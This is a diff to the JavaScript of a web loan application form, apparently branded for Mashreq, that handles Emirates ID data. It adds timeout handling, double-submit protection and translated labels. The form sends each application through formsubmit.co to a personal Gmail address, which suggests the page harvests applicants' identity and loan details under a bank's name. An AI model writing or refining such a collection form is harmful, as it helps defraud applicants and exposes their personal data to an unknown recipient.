@@ -1,3 +1,4 @@
+(function () {
 const {
   LOAN_CATEGORIES,
   formatEmiratesId,
@@ -21,6 +22,7 @@ const menuToggle = document.querySelector("#menu-toggle");
 const banner = document.querySelector("#banner");
 
 let saveTimer = 0;
+let sending = false;
 
 function fillSelect(id, values, placeholderText) {
   const select = document.getElementById(id);
@@ -243,7 +245,8 @@ function makeReference() {
 const MAIL_TO = "afzal056m@gmail.com";
 const WEB3FORMS_KEY = "";
 const SUCCESS_KEY = "mashreq-loan-success";
-const SEND_ERROR = "The request could not be sent. Please try again or contact the support department.";
+const SEND_ERROR = "The form service timed out before it could receive this application. Your answers are still here. Please wait a minute and try again.";
+const SEND_TIMEOUT_MS = 20000;
 
 function applicationPayload(data, reference) {
   const lines = [
@@ -296,18 +299,35 @@ async function sendViaWeb3Forms(data, reference) {
 }
 
 async function sendApplication(data, reference) {
-  const response = await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(MAIL_TO)}`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
-      Accept: "application/json",
-    },
-    body: new URLSearchParams(applicationPayload(data, reference)).toString(),
-  });
-  const result = await response.json().catch(() => ({}));
-  const accepted = result.success === true || result.success === "true";
-  if (!response.ok || !accepted) {
-    throw new Error(result.message || "send-failed");
+  const controller = new AbortController();
+  const timer = window.setTimeout(() => controller.abort(), SEND_TIMEOUT_MS);
+  try {
+    const response = await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(MAIL_TO)}`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Accept: "application/json",
+      },
+      body: JSON.stringify(applicationPayload(data, reference)),
+      signal: controller.signal,
+    });
+    if (response.status === 522 || response.status === 524 || response.status === 504 || response.status === 503) {
+      throw new Error("timeout");
+    }
+    const result = await response.json().catch(() => ({}));
+    const accepted = result.success === true || result.success === "true";
+    if (!response.ok || !accepted) {
+      const message = typeof result.message === "string" ? result.message.trim() : "";
+      if (!message || /server error/i.test(message)) throw new Error("timeout");
+      throw new Error(message);
+    }
+  } catch (error) {
+    if (error instanceof Error && error.message !== "timeout" && error.name !== "AbortError" && !(error instanceof TypeError)) {
+      throw error;
+    }
+    throw new Error("timeout");
+  } finally {
+    window.clearTimeout(timer);
   }
 }
 
@@ -356,38 +376,42 @@ async function finish() {
   if (Object.keys(errors).length) {
     showErrors(errors);
     button.disabled = false;
-    button.textContent = "Submit application";
+    button.textContent = window.SiteI18n ? window.SiteI18n.t("submit") : "Submit application";
     showFormStatus(Object.values(errors)[0]);
     return;
   }
 
   const reference = makeReference();
-  hideFormStatus();
+  const sendingLabel = window.SiteI18n ? window.SiteI18n.t("sending") : "Sending application…";
+  const submitLabel = window.SiteI18n ? window.SiteI18n.t("submit") : "Submit application";
   button.disabled = true;
-  button.textContent = "Sending application…";
+  button.textContent = sendingLabel;
+  showFormStatus(sendingLabel, true);
   try {
     if (WEB3FORMS_KEY) await sendViaWeb3Forms(data, reference);
     else await sendApplication(data, reference);
     showReceived(data, reference);
   } catch (error) {
     button.disabled = false;
-    button.textContent = "Submit application";
+    button.textContent = submitLabel;
     const detail = error instanceof Error ? error.message : "";
-    showFormStatus(detail && detail !== "send-failed" ? detail : SEND_ERROR);
+    const fallback = window.SiteI18n ? window.SiteI18n.t("sendError") : SEND_ERROR;
+    showFormStatus(!detail || detail === "send-failed" || detail === "timeout" ? fallback : detail);
   }
 }
 
 function hideFormStatus() {
   const status = document.querySelector("#form-status");
   status.hidden = true;
-  status.classList.remove("is-open");
+  status.classList.remove("is-open", "is-wait");
   status.textContent = "";
 }
 
-function showFormStatus(message) {
+function showFormStatus(message, waiting) {
   const status = document.querySelector("#form-status");
   status.hidden = false;
   status.classList.add("is-open");
+  status.classList.toggle("is-wait", waiting === true);
   status.style.display = "flex";
   status.textContent = message;
   live.textContent = message;
@@ -570,6 +594,14 @@ function bindForm() {
 }
 
 function init() {
+  form.addEventListener("submit", (event) => {
+    event.preventDefault();
+    if (sending) return;
+    sending = true;
+    Promise.resolve(finish()).finally(() => {
+      sending = false;
+    });
+  });
   try {
     setupChrome();
   } catch {
@@ -589,3 +621,4 @@ function init() {
 }
 
 init();
+})();
